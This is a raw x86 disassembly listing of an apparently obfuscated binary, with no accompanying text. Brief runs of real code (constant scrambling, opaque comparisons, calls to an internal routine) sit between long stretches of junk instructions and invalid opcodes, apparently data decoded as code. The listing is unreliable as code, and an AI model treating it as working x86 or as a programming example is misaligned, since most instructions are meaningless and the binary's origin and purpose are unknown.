  409849:	xor    ecx,0x354f
  40984f:	add    eax,edx
  409851:	mov    edx,DWORD PTR [ebp-0x10]
  409854:	adc    ecx,esi
  409856:	mov    esi,DWORD PTR [ebp-0xc]
  409859:	cmp    edx,eax
  40985b:	jne    0x409869
  409861:	cmp    esi,ecx
  409863:	je     0x40a10f
  409869:	mov    DWORD PTR [ebp-0x28],0x4db
  409870:	mov    DWORD PTR [ebp-0x24],0x233b
  409877:	mov    DWORD PTR [ebp-0x30],0x2c94
  40987e:	push   0x6b33
  409883:	mov    DWORD PTR [ebp-0x2c],0x647f
  40988a:	jmp    0x409b09
  40988f:	and    BYTE PTR [ebx-0x53bd1443],ah
  409895:	sub    al,0xab
  409897:	dec    edi
  409898:	test   al,0xc
  40989a:	xchg   edx,eax
  40989b:	mov    ebp,0xf2cfc338
  4098a0:	xchg   DWORD PTR [esi-0x413d8642],edi
  4098a6:	mov    esi,0xc3ce8f16
  4098ab:	push   esp
  4098ac:	imul   ebx,eax,0x4b8bbc1d
  4098b2:	xchg   BYTE PTR [edi-0x21],cl
  4098b5:	xor    eax,0xd9f9f23f
  4098ba:	stos   BYTE PTR es:[edi],al
  4098bb:	mov    bh,0x7b
  4098bd:	out    dx,al
  4098be:	jl     0x4098ec
  4098c0:	mov    ecx,0x72d9c7df
  4098c5:	sbb    ch,bl
  4098c7:	pop    ebp
  4098c8:	mov    ebp,0x42fe84c7
  4098cd:	into   
  4098ce:	add    dl,BYTE PTR [esi]
  4098d0:	adc    DWORD PTR [ebx+0x547ebd16],0x34
  4098d7:	sti    
  4098d8:	add    DWORD PTR ds:0x4a811cbd,0xffffffe8
  4098df:	js     0x409956
  4098e1:	inc    eax
  4098e2:	aam    0x4
  4098e4:	push   esp
  4098e5:	repz push esi
  4098e7:	jb     0x409945
  4098e9:	stos   DWORD PTR es:[edi],eax
  4098ea:	(bad)  
  4098eb:	aaa    
  4098ec:	pop    edx
  4098ed:	imul   esi,DWORD PTR [ebp+0x36ff7d2e],0x50
  4098f4:	fstp   DWORD PTR [edi-0x7b]
  4098f7:	retf   0xad5f
  4098fa:	pushf  
  4098fb:	jb     0x409970
  4098fd:	xchg   edx,eax
  4098fe:	in     eax,0x5a
  409900:	scas   al,BYTE PTR es:[edi]
  409901:	sub    BYTE PTR [ebx-0x2c],0xa6
  409905:	mov    esp,DWORD PTR fs:[edx-0x45]
  409909:	clc    
  40990a:	or     BYTE PTR [ebx+0x57],bl
  40990d:	ins    DWORD PTR es:[edi],dx
  40990e:	clc    
  40990f:	fistp  QWORD PTR [ecx+0x4b]
  409912:	pop    ecx
  409913:	aaa    
  409914:	rcl    DWORD PTR [edx-0x24],0x9c
  409918:	retf   
  409919:	push   esi
  40991a:	and    eax,0x29eae390
  40991f:	pop    esp
  409920:	icebp  
  409921:	xor    eax,0xc7974ece
  409926:	repz bound ebp,QWORD PTR [edi+0x5e]
  40992a:	rcr    DWORD PTR [edi],cl
  40992c:	mov    edi,0x6f368d46
  409931:	mov    eax,ds:0x92211432
  409936:	or     al,0x41
  409938:	fist   DWORD PTR [edi+eax*4+0x56]
  40993c:	call   0xc56a:0xda856b85
  409943:	clc    
  409944:	mov    edi,0xd73e382f
  409949:	in     al,dx
  40994a:	sbb    ch,ch
  40994c:	or     ch,BYTE PTR [edx]
  40994e:	jne    0x4099ae
  409950:	mov    ds,WORD PTR [eax+0x7]
  409953:	jg     0x40997c
  409955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409956:	pushf  
  409957:	ds jbe 0x40993d
  40995a:	into   
  40995b:	push   esp
  40995c:	or     BYTE PTR [ecx-0x6d],ah
  40995f:	pop    eax
  409960:	mov    edx,DWORD PTR [eax]
  409962:	cmp    eax,0xcd9d3b5e
  409967:	cmp    al,0x46
  409969:	cli    
  40996a:	cwde   
  40996b:	out    dx,eax
  40996c:	xor    DWORD PTR [edi+0x35],eax
  40996f:	mov    eax,0x8032776f
  409974:	retf   0xe67b
  409977:	test   al,0x99
  409979:	dec    esp
  40997a:	popa   
  40997b:	aam    0x6a
  40997d:	push   esp
  40997e:	lods   al,BYTE PTR ds:[esi]
  40997f:	jb     0x409914
  409981:	dec    ebp
  409982:	(bad)  
  409984:	add    al,0x2f
  409986:	sub    BYTE PTR [eax],bh
  409988:	test   eax,0xdb1c4b5a
  40998d:	xchg   DWORD PTR [ecx],ebx
  40998f:	xchg   ebx,eax
  409990:	(bad)  
  409991:	cli    
  409992:	int3   
  409993:	nop
  409994:	shl    DWORD PTR [edi-0x4f],1
  409997:	dec    eax
  409998:	and    dh,ah
  40999a:	mov    eax,ds:0x33421043
  40999f:	addr16 xchg edx,eax
  4099a1:	out    dx,eax
  4099a2:	inc    edx
  4099a3:	sub    eax,DWORD PTR [eax+0x26]
  4099a6:	cmp    DWORD PTR [edi-0x4],esi
  4099a9:	les    ebx,FWORD PTR [ebp+eax*8+0x74119cd9]
  4099b0:	sub    al,0x66
  4099b2:	sub    eax,esp
  4099b4:	out    0x7e,al
  4099b6:	adc    eax,0x997a3d6
  4099bb:	push   cs
  4099bc:	adc    al,0x92
  4099be:	mov    eax,0xe2b9e05d
  4099c3:	into   
  4099c4:	push   esp
  4099c5:	(bad)  
  4099c6:	loopne 0x409992
  4099c8:	mov    dl,0xa
  4099ca:	push   0xffffffa4
  4099cc:	sub    edi,eax
  4099ce:	jmp    0xe7b30522
  4099d3:	or     al,0xf1
  4099d5:	pop    esi
  4099d6:	inc    eax
  4099d7:	rcl    DWORD PTR [ebx-0x3b704705],0xaf
  4099de:	pushf  
  4099df:	data16 (bad) 
  4099e1:	retf   
  4099e2:	mov    edx,0x5f30221b
  4099e7:	mov    al,0xec
  4099e9:	bound  esp,QWORD PTR [ecx-0x38ff94d2]
  4099ef:	xor    ebp,0x45
  4099f2:	adc    BYTE PTR [ebp-0x50dffcbb],cl
  4099f8:	enter  0x49f0,0xca
  4099fc:	xor    esi,DWORD PTR [edx]
  4099fe:	cmp    dh,BYTE PTR [eax]
  409a00:	sbb    eax,0xdb5e92e0
  409a05:	push   ss
  409a06:	(bad)  
  409a07:	push   eax
  409a08:	mov    ah,0xdb
  409a0a:	mov    al,ds:0x672b5dbc
  409a0f:	ret    
  409a10:	sub    esp,DWORD PTR [ebx]
  409a12:	cmp    eax,0xba2a326b
  409a17:	mov    bl,0xd4
  409a19:	xor    DWORD PTR [edx+0x707cf4cf],ebp
  409a1f:	jmp    0x9181deb
  409a24:	enter  0x21e9,0x77
  409a28:	mov    edi,0x12ab213
  409a2d:	jae    0x409a09
  409a2f:	adc    al,0xc9
  409a31:	fisttp DWORD PTR [edi+0x7bb39c14]
  409a37:	fucom  st(1)
  409a39:	push   ds
  409a3a:	add    BYTE PTR [ecx+0x5c],bh
  409a3d:	test   eax,0xf5920aea
  409a42:	aas    
  409a43:	(bad)  
  409a44:	pusha  
  409a45:	pop    esp
  409a46:	dec    ecx
  409a47:	int    0x67
  409a49:	jmp    0x92b3:0x6cfa4f7d
  409a50:	push   ss
  409a51:	(bad)  
  409a52:	sub    DWORD PTR [edi-0x12db3422],eax
  409a58:	jb     0x4099de
  409a5a:	mov    al,ds:0x4da3d17f
  409a5f:	mov    edx,0xa34e86f5
  409a64:	int3   
  409a65:	(bad)  
  409a66:	jb     0x409a8d
  409a68:	loope  0x409ac0
  409a6a:	push   ecx
  409a6b:	push   ecx
  409a6c:	sbb    al,0x2c
  409a6e:	call   DWORD PTR [edi+0x3]
  409a71:	dec    ebp
  409a72:	in     eax,0x54
  409a74:	mov    eax,ds:0x7c791237
  409a79:	(bad)  
  409a7a:	lds    ebx,FWORD PTR [ebp+0x6a]
  409a7d:	mov    ds:0x88992537,eax
  409a82:	into   
  409a83:	jmp    0x409a32
  409a85:	inc    dh
  409a87:	xchg   bh,ah
  409a89:	dec    DWORD PTR [edi-0x5e55e04a]
  409a8f:	jecxz  0x409ae3
  409a91:	mov    ch,0x5
  409a93:	push   0x53
  409a95:	xchg   DWORD PTR [edi-0x4a595cf],esi
  409a9b:	mov    cl,0x4a
  409a9d:	cmp    al,BYTE PTR [eax+ebx*8]
  409aa0:	daa    
  409aa1:	dec    eax
  409aa2:	mov    al,ds:0x10ba6ee6
  409aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa8:	mov    edx,0xe224ba43
  409aad:	loop   0x409aa9
  409aaf:	icebp  
  409ab0:	xor    edx,DWORD PTR [eax+edx*1]
  409ab3:	xchg   ebx,eax
  409ab4:	cmpxchg bh,dl
  409ab7:	test   eax,0x59ac24dc
  409abc:	ins    BYTE PTR es:[edi],dx
  409abd:	in     al,0xa6
  409abf:	cmc    
  409ac0:	push   esp
  409ac1:	int3   
  409ac2:	xlat   BYTE PTR ds:[ebx]
  409ac3:	scas   eax,DWORD PTR es:[edi]
  409ac4:	pause  
  409ac6:	jmp    0x715f:0xd67d09c8
  409acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ace:	pusha  
  409acf:	adc    BYTE PTR [eax-0x1fea75f3],dh
  409ad5:	sbb    DWORD PTR [edx],0x787cc6ba
  409adb:	fs jne 0x409a78
  409ade:	add    bl,ah
  409ae0:	sub    al,0x66
  409ae2:	xchg   ebx,eax
  409ae3:	xchg   DWORD PTR [edx],ebp
  409ae5:	test   eax,0xef41efd0
  409aea:	ret    
  409aeb:	jle    0x409b1c
  409aed:	in     al,0x19
  409aef:	inc    ebp
  409af0:	mov    ecx,0x663c4c46
  409af5:	outs   dx,DWORD PTR ds:[esi]
  409af6:	in     eax,dx
  409af7:	int3   
  409af8:	dec    ecx
  409af9:	icebp  
  409afa:	fsubrp st(3),st
  409afc:	pop    esi
  409afd:	adc    al,0x9f
  409aff:	jg     0x409af6
  409b01:	dec    esp
  409b02:	mov    ebp,0x51722
  409b07:	sbb    bl,BYTE PTR ds:0x8bd0458b
  409b0d:	dec    ebp
  409b0e:	aam    0x68
  409b10:	(bad)  
  409b11:	jl     0x409b13
  409b13:	add    BYTE PTR [ecx+0x50],dl
  409b16:	call   0x41594e
  409b1b:	mov    ecx,DWORD PTR [ebp-0x28]
  409b1e:	mov    esi,DWORD PTR [ebp-0x24]
  409b21:	push   0x4e1a18a
  409b26:	push   0x283cdcc
  409b2b:	and    edx,esi
  409b2d:	and    eax,ecx
  409b2f:	push   edx
  409b30:	push   eax
  409b31:	call   0x41594e
  409b36:	xor    eax,0x687b
  409b3b:	xor    edx,0x18d4
  409b41:	mov    DWORD PTR [ebp-0x30],eax
  409b44:	mov    DWORD PTR [ebp-0x2c],edx
  409b47:	mov    eax,ds:0x4228bc
  409b4c:	cmp    eax,0x7cd80819
  409b51:	jne    0x40a10f
  409b57:	mov    eax,DWORD PTR [ebp-0x18]
  409b5a:	mov    ecx,DWORD PTR [ebp-0x14]
  409b5d:	mov    edx,DWORD PTR [ebp-0x18]
  409b60:	mov    esi,DWORD PTR [ebp-0x14]
  409b63:	shrd   eax,ecx,0x2
  409b67:	shl    edx,0x1e
  409b6a:	mov    edx,DWORD PTR ds:0x4226a8
  409b70:	mov    edx,DWORD PTR [edx+0x1a8]
  409b76:	shr    ecx,0x2
  409b79:	xor    esi,esi
  409b7b:	mov    ecx,0x32de6d5d
  409b80:	xor    eax,ecx
  409b82:	or     eax,esi
  409b84:	mov    DWORD PTR [edx],eax
  409b86:	mov    eax,DWORD PTR [ebp-0x18]
  409b89:	mov    edx,DWORD PTR [ebp-0x14]
  409b8c:	shrd   eax,edx,0x2
  409b90:	shr    edx,0x2
  409b93:	mov    edx,DWORD PTR [ebp-0x18]
  409b96:	mov    esi,DWORD PTR [ebp-0x14]
  409b99:	xor    eax,ecx
  409b9b:	xor    esi,esi
  409b9d:	or     eax,esi
  409b9f:	mov    ds:0x4228bc,eax
  409ba4:	mov    BYTE PTR [ebp-0x2],0x4f
  409ba8:	mov    BYTE PTR [ebp-0x1],0xf9
  409bac:	movzx  eax,BYTE PTR [ebp-0x1]
  409bb0:	shl    edx,0x1e
  409bb3:	mov    dl,BYTE PTR [ebp-0x2]
  409bb6:	xor    al,0x42
  409bb8:	add    al,dl
  409bba:	jmp    0x409e39
  409bbf:	mov    ah,0x7e
  409bc1:	mov    ch,0xd4
  409bc3:	mov    ebx,0x3e9ebcfc
  409bc8:	mov    cl,0x9a
  409bca:	jecxz  0x409bee
  409bcc:	pop    ecx
  409bcd:	mov    al,ds:0xbe8bae90
  409bd2:	mov    esi,0xbebec279
  409bd7:	xchg   DWORD PTR [eax],ecx
  409bd9:	inc    esp
  409bda:	ret    0x6119
  409bdd:	hlt    
  409bde:	inc    esp
  409bdf:	push   0xffffffd4
  409be1:	mov    esi,esi
  409be3:	aaa    
  409be4:	fs dec edx
  409be6:	pop    ebp
  409be7:	ds push ecx
  409be9:	ret    
  409bea:	or     eax,0xd6c6ade2
  409bef:	mov    ecx,ds
  409bf1:	and    ecx,DWORD PTR [ebp+0x53]
  409bf4:	(bad)  
  409bf5:	pusha  
  409bf6:	xlat   BYTE PTR ds:[ebx]
  409bf7:	jp     0x409c1a
  409bf9:	xor    ah,ah
  409bfb:	or     eax,0x6d81c9c5
  409c00:	out    0x29,eax
  409c02:	mov    ebp,0x85ed9428
  409c07:	loopne 0x409b96
  409c09:	pop    ebp
  409c0a:	sub    al,0x9
  409c0c:	loope  0x409bd5
  409c0e:	inc    ecx
  409c0f:	pop    ds
  409c10:	jns    0x409c25
  409c12:	(bad)  
  409c14:	repnz sub eax,0x668f9a8
  409c1a:	sbb    eax,0xe6e8e826
  409c1f:	mov    ecx,0xf8676d33
  409c24:	ss ret 0x94d7
  409c28:	mov    eax,ds:0x4a77b1c5
  409c2d:	and    BYTE PTR [edi],0x55
  409c30:	ror    DWORD PTR ds:0xf4c15556,1
  409c36:	ret    0x2b97
  409c39:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c3b:	call   0x8904:0x934c687c
  409c42:	ja     0x409c48
  409c44:	addr16 in eax,0xf0
  409c47:	ret    
  409c48:	push   edi
  409c49:	scas   eax,DWORD PTR es:[edi]
  409c4a:	mov    eax,ds:0x3c1adb02
  409c4f:	repz sub DWORD PTR [edi-0x23],ebp
  409c53:	pop    es
  409c54:	stc    
  409c55:	(bad)  
  409c56:	mov    esp,0x6a013d2f
  409c5b:	fiadd  WORD PTR [edx-0x4a]
  409c5e:	(bad)  
  409c5f:	outs   dx,DWORD PTR ds:[esi]
  409c60:	pop    edi
  409c61:	mov    cr5,edx
  409c64:	popa   
  409c65:	dec    ebx
  409c66:	aad    0x8
  409c68:	mov    eax,ds:0x1bad175f
  409c6d:	push   0xaf6bf4f3
  409c72:	push   ebp
  409c73:	inc    eax
  409c74:	mov    ebx,0x55129a7b
  409c79:	pop    ebp
  409c7a:	xchg   edi,eax
  409c7b:	jge    0x409c36
  409c7d:	(bad)  
  409c7e:	pop    ss
  409c7f:	mov    ds:0x1528aa42,eax
  409c84:	jno    0x409c36
  409c86:	push   ebp
  409c87:	adc    BYTE PTR [eax],al
  409c89:	xor    ah,bh
  409c8b:	cmp    ah,BYTE PTR [ecx-0x34]
  409c8e:	jae    0x409c53
  409c90:	push   esi
  409c91:	popf   
  409c92:	and    ecx,DWORD PTR [edx]
  409c94:	lods   eax,DWORD PTR ds:[esi]
  409c95:	in     al,dx
  409c96:	push   ebp
  409c97:	xlat   BYTE PTR ds:[ebx]
  409c98:	ins    DWORD PTR es:[edi],dx
  409c99:	sub    eax,0xf0f21ae
  409c9e:	add    DWORD PTR [edx],edi
  409ca0:	xlat   BYTE PTR ds:[ebx]
  409ca1:	mov    bl,0xc0
  409ca3:	jne    0x409c6e
  409ca5:	leave  
  409ca6:	push   cs
  409ca7:	imul   edx,ebx,0x7
  409caa:	dec    esi
  409cab:	and    ecx,DWORD PTR [ebx+0x73a2f983]
  409cb1:	(bad)  
  409cb2:	cmp    DWORD PTR [esi+eax*8],esp
  409cb5:	shr    bl,1
  409cb7:	pop    ds
  409cb8:	sub    ah,0x6d
  409cbb:	xor    eax,0x84da1a62
  409cc0:	repz pushf 
  409cc2:	xor    esp,edi
  409cc4:	inc    edi
  409cc5:	push   ebp
  409cc6:	dec    ebp
  409cc7:	inc    edx
  409cc8:	int3   
  409cc9:	add    bh,BYTE PTR [ebx]
  409ccb:	pop    ecx
  409ccc:	mov    esp,0x63cad80f
  409cd1:	stos   DWORD PTR es:[edi],eax
  409cd2:	xchg   ecx,eax
  409cd3:	dec    DWORD PTR [ebx-0x358d5b91]
  409cd9:	pop    edi
  409cda:	repz mov ds:0xd783e350,eax
  409ce0:	bound  eax,QWORD PTR [ebp-0x2474e966]
  409ce6:	(bad)  
  409ce7:	dec    edi
  409ce8:	sub    ch,bh
  409cea:	xchg   edi,eax
  409ceb:	jno    0x409c83
  409ced:	cmp    DWORD PTR [ebx],ecx
  409cef:	test   BYTE PTR [eax],cl
  409cf1:	mov    DWORD PTR [ecx+0x55],edi
  409cf4:	or     eax,0xa9067cea
  409cf9:	jle    0x409cad
  409cfb:	clc    
  409cfc:	retf   0x4800
  409cff:	nop
  409d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d01:	sbb    esp,edi
  409d03:	ret    
  409d04:	es stos DWORD PTR es:[edi],eax
  409d06:	in     al,0x75
  409d08:	sub    BYTE PTR [ebp-0x7b],0x87
  409d0c:	dec    ebp
  409d0d:	(bad)  
  409d0e:	stos   BYTE PTR es:[edi],al
  409d0f:	fistp  QWORD PTR [esi+ebp*4+0x1c6e295f]
  409d16:	inc    esp
  409d17:	pop    ss
  409d18:	in     eax,dx
  409d19:	mov    ds:0xc1996418,eax
  409d1e:	adc    eax,0x4bc0ff5f
  409d23:	(bad)  
  409d24:	xchg   esp,eax
  409d25:	ret    
  409d26:	imul   edx,edi,0xffffff81
  409d29:	test   DWORD PTR [eax+0x53],ecx
  409d2c:	daa    
  409d2d:	push   0x24
  409d2f:	in     al,0x5
  409d31:	or     BYTE PTR [edi+0x7b5780e8],ch
  409d37:	lock jecxz 0x409cfc
  409d3a:	jae    0x409cfa
  409d3c:	cmp    eax,0x1c9ddf86
  409d41:	dec    ebp
  409d42:	xchg   esp,eax
  409d43:	jmp    0x409db1
  409d45:	aam    0xb7
  409d47:	loopne 0x409d0d
  409d49:	outs   dx,BYTE PTR ds:[esi]
  409d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d4b:	sbb    BYTE PTR [edx-0x23c2894b],dh
  409d51:	push   ebp
  409d52:	rcr    DWORD PTR [esi+0x1d7bcb74],0xc2
  409d59:	inc    esp
  409d5a:	lods   eax,DWORD PTR ds:[esi]
  409d5b:	test   eax,0xad468e95
  409d60:	sub    BYTE PTR [eax+0x55],ch
  409d63:	popf   
  409d64:	jecxz  0x409cf8
  409d66:	jno    0x409da5
  409d68:	or     BYTE PTR [edi],0x86
  409d6b:	lahf   
  409d6c:	inc    edx
  409d6d:	and    bh,BYTE PTR [si+0x4c]
  409d71:	int    0xc3
  409d73:	sub    eax,DWORD PTR [ecx-0x3bf553a5]
  409d79:	je     0x409d88
  409d7b:	adc    al,0xb6
  409d7d:	mov    esi,0xc63be224
  409d82:	xor    BYTE PTR [ebx-0x3bbdaacc],cl
  409d88:	rcl    DWORD PTR [edx],cl
  409d8a:	inc    esp
  409d8b:	cmc    
  409d8c:	mul    DWORD PTR [edi+esi*8-0x409c5334]
  409d93:	inc    esp
  409d94:	retf   0x158a
  409d97:	rol    BYTE PTR [edx],1
  409d99:	mov    BYTE PTR [eax],bl
  409d9b:	and    al,0x4a
  409d9d:	and    BYTE PTR es:[ecx+0x46],ah
  409da1:	nop
  409da2:	sbb    DWORD PTR [edi-0x2a],0xf
  409da6:	jmp    0x700aa855
  409dab:	test   esi,eax
  409dad:	js     0x409e00
  409daf:	xchg   ebx,eax
  409db0:	xor    bh,al
  409db2:	loop   0x409df6
  409db4:	pop    ecx
  409db5:	jns    0x409d95
  409db7:	xor    eax,0xcc073067
  409dbc:	push   0xffffffb2
  409dbe:	stos   BYTE PTR es:[edi],al
  409dbf:	xlat   BYTE PTR ds:[ebx]
  409dc0:	scas   al,BYTE PTR es:[edi]
  409dc1:	jbe    0x409e34
  409dc3:	add    al,0x1d
  409dc5:	fadd   st(5),st
  409dc7:	out    0x3e,eax
  409dc9:	xchg   esi,eax
  409dca:	ss call 0xd8bd087
  409dd0:	test   esp,eax
  409dd2:	pop    edi
  409dd3:	mov    bh,0xf8
  409dd5:	mov    esi,0x81bfafec
  409dda:	jp     0x409da0
  409ddc:	cmp    BYTE PTR [ecx+edx*1],al
  409ddf:	sub    BYTE PTR [edx+0x47],ch
  409de2:	and    dh,BYTE PTR [ebx]
  409de4:	shl    DWORD PTR [ebx-0x51],1
  409de7:	jb     0x409dd5
  409de9:	jge    0x409d9f
  409deb:	sub    eax,0x8d61a85d
  409df0:	(bad)  
  409df1:	fld    DWORD PTR [esi-0xf]
  409df4:	or     al,0x6f
  409df6:	ins    BYTE PTR es:[edi],dx
  409df7:	jl     0x409db4
  409df9:	xchg   esp,eax
  409dfa:	mov    ebp,0x6b65b21c
  409dff:	mov    ah,0x93
  409e01:	mov    bl,0x46
  409e03:	into   
  409e04:	mov    WORD PTR [ecx+eiz*4-0x5a593f8b],ss
  409e0b:	jge    0x409e25
  409e0d:	mov    ecx,0x39b12c1b
  409e12:	int3   
  409e13:	in     al,dx
  409e14:	push   ecx
  409e15:	sar    edx,0x91
  409e18:	aas    
  409e19:	cmp    eax,0x567a77eb
  409e1e:	add    edx,DWORD PTR [edx+edi*4]
  409e21:	cwde   
  409e22:	mov    edi,0x932fe615
  409e27:	dec    esi
  409e28:	xor    ah,BYTE PTR [eax+ebx*4]
  409e2b:	(bad)  
  409e2c:	icebp  
  409e2d:	dec    ebp
  409e2e:	xor    BYTE PTR [edx-0x6a],al
  409e31:	(bad)  
  409e32:	rol    DWORD PTR [ebx+ebp*4],cl
  409e35:	xchg   DWORD PTR [ecx-0x5d],edi
  409e38:	out    dx,al
  409e39:	push   0x6
  409e3b:	add    eax,0xfa
  409e40:	mov    BYTE PTR [ebp-0x4],al
  409e43:	mov    BYTE PTR [ebp-0x3],0x67
  409e47:	pop    eax
  409e48:	mov    BYTE PTR [ebp-0x1],al
  409e4b:	mov    BYTE PTR [ebp-0x2],0x3
  409e4f:	mov    dl,BYTE PTR [ebp-0x2]
  409e52:	movzx  esi,dl
  409e55:	cdq    
  409e56:	idiv   esi
  409e58:	mov    dl,BYTE PTR [ebp-0x1]
  409e5b:	add    al,dl
  409e5d:	mov    dl,BYTE PTR [ebp-0x3]
  409e60:	or     al,dl
  409e62:	mov    dl,BYTE PTR [ebp-0x4]
  409e65:	add    al,0x3a
  409e67:	cmp    dl,al
  409e69:	jae    0x40a10f
  409e6f:	mov    eax,DWORD PTR [ebp-0x18]
  409e72:	jmp    0x40a0f1
  409e77:	popa   
  409e78:	nop
  409e79:	popf   
  409e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7b:	mov    ah,0xb8
  409e7d:	imul   ebx,DWORD PTR [eax+edi*1-0xa5b79d4],0x7b
  409e85:	out    dx,al
  409e86:	iret   
  409e87:	imul   edx,DWORD PTR [ecx-0x3d864142],0x8476bebe
  409e91:	mov    eax,ebx
  409e93:	sbb    BYTE PTR [esi],dh
  409e95:	push   0xfffffffc
  409e97:	push   cs
  409e98:	stos   BYTE PTR es:[edi],al
  409e99:	jmp    0xd2d1:0xa7bc030c
  409ea0:	cmp    al,0x55
  409ea2:	outs   dx,DWORD PTR ds:[esi]
  409ea3:	jp     0x409ed7
  409ea5:	push   es
  409ea6:	cdq    
  409ea7:	out    dx,eax
  409ea8:	aam    0x8
  409eaa:	mov    DWORD PTR [ebp+0xd],ecx
  409ead:	sub    eax,0xf763c2d4
  409eb2:	outs   dx,BYTE PTR ds:[esi]
  409eb3:	jb     0x409ece
  409eb5:	mov    ds:0xb68ad0d9,eax
  409eba:	mov    al,ds:0xdd32529
  409ebf:	and    ecx,esp
  409ec1:	xor    ecx,edx
  409ec3:	jmp    0x19bdfe40
  409ec8:	inc    ebp
  409ec9:	jnp    0x409ecc
  409ecb:	cwde   
  409ecc:	data16 xor BYTE PTR [eax+0x46],ch
  409ed0:	retf   0xbfb1
  409ed3:	test   ah,ch
  409ed5:	cmp    DWORD PTR ds:0xce8dba2,0xffffffe7
  409edc:	adc    edx,eax
  409ede:	xor    eax,0x62fe9878
  409ee3:	jmp    0x409f09
  409ee5:	cmp    BYTE PTR [eax+ebx*4],ah
  409ee8:	sub    edi,edx
  409eea:	ins    DWORD PTR es:[edi],dx
  409eeb:	cld    
  409eec:	push   edi
  409eed:	cmp    al,BYTE PTR [ebx+ebp*2]
  409ef0:	lods   al,BYTE PTR ds:[esi]
  409ef1:	mov    eax,ds:0x2a3870bc
  409ef6:	popf   
  409ef7:	xor    dl,bl
  409ef9:	pop    es
  409efa:	ret    0xbf69
  409efd:	stos   DWORD PTR es:[edi],eax
  409efe:	call   0x23ee9baa
  409f03:	adc    al,0xc6
  409f05:	in     eax,dx
  409f06:	loop   0x409f76
  409f08:	inc    ecx
  409f09:	inc    ebp
  409f0a:	xor    ch,cl
  409f0c:	push   ecx
  409f0d:	lds    eax,FWORD PTR [esi+ebx*8+0x1f]
  409f11:	push   ebx
  409f12:	xchg   edi,eax
  409f13:	aaa    
  409f14:	cwde   
  409f15:	fidivr WORD PTR ds:0xf242c493
  409f1b:	out    0x3c,eax
  409f1d:	jp     0x409ed0
  409f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f20:	sub    BYTE PTR [ebp+0x75],dh
  409f23:	xor    BYTE PTR [ecx+0x44],ah
  409f26:	icebp  
  409f27:	inc    esp
  409f28:	es into 
  409f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f2b:	fimul  WORD PTR [esp+eax*8+0x2e]
  409f2f:	rcl    BYTE PTR [ebx-0x3d3996b1],1
  409f35:	mov    dh,0xb8
  409f37:	ret    
  409f38:	xchg   ebx,eax
  409f39:	sbb    dh,BYTE PTR [edx-0x24ff6a8a]
  409f3f:	and    BYTE PTR [ebx-0x3f401aa0],cl
  409f45:	inc    eax
  409f46:	or     DWORD PTR [edx-0x9],esi
  409f49:	mov    ebx,0xe2b5e44f
  409f4e:	cmp    dl,BYTE PTR [ecx-0x22908be1]
  409f54:	sub    al,0xa0
  409f56:	cmc    
  409f57:	push   0x9e6ef3df
  409f5c:	bound  edx,QWORD PTR [edx+0x66f4e3c8]
  409f62:	test   al,0xbc
  409f64:	dec    ebx
  409f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f66:	mov    ds:0x4c421eaa,al
  409f6b:	into   
  409f6c:	push   esi
  409f6d:	inc    ecx
  409f6e:	outs   dx,DWORD PTR ds:[esi]
  409f6f:	imul   ebx,DWORD PTR [ecx-0x54],0xaf290aee
  409f76:	enter  0x862f,0x9
  409f7a:	or     al,0x9d
  409f7c:	pushf  
  409f7d:	test   DWORD PTR [eax+0x184eabab],edx
  409f83:	hlt    
  409f84:	xor    al,0xc6
  409f86:	jno    0x409fa1
  409f88:	out    0xad,eax
  409f8a:	lods   eax,DWORD PTR ds:[esi]
  409f8b:	jne    0x409f5e
  409f8d:	(bad)  [esi]
  409f8f:	in     al,0xba
  409f91:	loop   0x409f87
  409f93:	(bad)  
  409f94:	test   al,0x14
  409f96:	sub    BYTE PTR [edx],cl
  409f98:	into   
  409f99:	cld    
  409f9a:	imul   ebp,DWORD PTR ds:0x5ef3c17c,0x5de7cddc
  409fa4:	loop   0x409f43
  409fa6:	jge    0x40a012
  409fa8:	pop    ebx
  409fa9:	cmp    eax,0x1911ba01
  409fae:	rep lods eax,DWORD PTR ds:[esi]
  409fb0:	cmp    BYTE PTR [esi],bh
  409fb2:	mov    dl,BYTE PTR ds:0xe1181e7
  409fb8:	or     al,0xbe
  409fba:	dec    edi
  409fbb:	ins    DWORD PTR es:[edi],dx
  409fbc:	loopne 0x40a01f
  409fbe:	pop    ecx
  409fbf:	sbb    dl,ah
  409fc1:	mov    WORD PTR [ebp-0x8632e85],?
  409fc7:	pop    eax
  409fc8:	daa    
  409fc9:	mov    al,ds:0xcb5a9371
  409fce:	mov    es,eax
  409fd0:	jle    0x409fcf
  409fd2:	cmp    eax,0x62b1885b
  409fd7:	and    al,0x48
  409fd9:	mov    al,0x3c
  409fdb:	fld    QWORD PTR [eax+0x3e1d17]
  409fe1:	int3   
  409fe2:	fsub   DWORD PTR [eax+eiz*4+0x39]
  409fe6:	mov    ebp,0xb5543bf9
  409feb:	and    ebp,DWORD PTR [esi+0x25]
  409fee:	mov    dh,0x67
  409ff0:	or     BYTE PTR [ecx-0x44],al
  409ff3:	jns    0x409f88
  409ff5:	pusha  
  409ff6:	repz sbb ch,ch
  409ff9:	xchg   edx,eax
  409ffa:	jbe    0x40a036
  409ffc:	(bad)  
  409ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ffe:	retf   
  409fff:	inc    edx
  40a000:	in     al,0x81
  40a002:	pop    ss
  40a003:	and    eax,0xbd99e961
  40a008:	adc    DWORD PTR [edi+0x1],ebx
  40a00b:	jne    0x40a053
  40a00d:	leave  
  40a00e:	shl    DWORD PTR [edx-0xaf3449a],cl
  40a014:	scas   eax,DWORD PTR es:[edi]
  40a015:	mov    ebx,0xe322301c
  40a01a:	pusha  
  40a01b:	cmp    eax,0x7d0c17fc
  40a020:	stos   BYTE PTR es:[edi],al
  40a021:	aam    0xee
  40a023:	cmp    DWORD PTR [ecx+0x2b92f3f0],0x762f206b
  40a02d:	les    ebp,FWORD PTR [ebp-0x3a6d4c62]
  40a033:	dec    eax
  40a034:	mov    edi,0x7cda7238
